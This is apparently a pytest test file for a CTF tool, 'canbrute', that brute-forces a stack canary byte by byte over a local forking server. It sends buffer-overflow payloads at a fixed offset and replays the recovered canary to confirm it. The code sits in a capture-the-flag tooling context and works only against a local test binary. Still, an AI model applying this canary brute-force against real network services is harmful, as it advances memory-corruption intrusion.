"""canbrute against a real forking server, checked by replaying what it found."""

from __future__ import annotations

import socket
import struct
import subprocess
import time

import pytest

from ctftools.tools import canbrute

OFFSET = 72  # buf is at rbp-0x50, the canary at rbp-0x8


def _free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


@pytest.fixture
def server(target):
    port = _free_port()
    proc = subprocess.Popen([target("fork_server"), str(port)],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            socket.create_connection(("127.0.0.1", port), timeout=0.2).close()
            break
        except OSError:
            time.sleep(0.05)
    else:
        proc.terminate()
        pytest.skip("the forking test server did not come up")
    yield port
    proc.terminate()
    proc.wait(timeout=5)


def _send(port: int, payload: bytes) -> bytes:
    sock = socket.create_connection(("127.0.0.1", port), timeout=2)
    try:
        sock.recv(16)
        sock.sendall(payload)
        data = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except OSError:
        pass
    finally:
        sock.close()
    return data


def test_probe_tells_a_live_child_from_a_dead_one(server):
    target = canbrute.Target(port=server, marker=b"ok", recv_until=b"go\n")
    assert target.probe(b"A" * 40) is True
    assert target.probe(b"A" * 100) is False


def test_canary_is_recovered_and_replays_cleanly(server):
    target = canbrute.Target(port=server, marker=b"ok", recv_until=b"go\n")
    result = canbrute.brute(target, b"A" * OFFSET, 8, name="canary", first_byte_zero=True)

    assert result.complete, f"only got {result.recovered.hex()}"
    assert result.recovered[0] == 0x00, "a glibc canary's low byte is always NUL"

    # The authority on whether it is right: send it and see the child survive.
    assert b"ok" in _send(server, b"A" * OFFSET + bytes(result.recovered))
    wrong = bytes([result.recovered[0]]) + bytes(b ^ 0xFF for b in result.recovered[1:])
    assert b"ok" not in _send(server, b"A" * OFFSET + wrong)


def test_the_canary_is_stable_across_connections(server):
    target = canbrute.Target(port=server, marker=b"ok", recv_until=b"go\n")
    first = canbrute.brute(target, b"A" * OFFSET, 3, name="canary", first_byte_zero=True)
    second = canbrute.brute(target, b"A" * OFFSET, 3, name="canary", first_byte_zero=True)
    assert first.recovered == second.recovered, "children should share the parent's canary"


def test_report_states_the_value_and_counts_connections(server):
    target = canbrute.Target(port=server, marker=b"ok", recv_until=b"go\n")
    report = canbrute.run(target, OFFSET, 8, quiet=True)
    entry = report.data["results"][0]
    assert entry["complete"] is True
    assert entry["value"] & 0xFF == 0
    assert report.data["connections"] >= 8


def test_a_wrong_offset_fails_loudly(server):
    target = canbrute.Target(port=server, marker=b"ok", recv_until=b"go\n")
    report = canbrute.run(target, OFFSET + 200, 2, quiet=True)
    assert report.data["results"][0]["complete"] is False
    assert any("stopped after" in w for w in report.warnings)
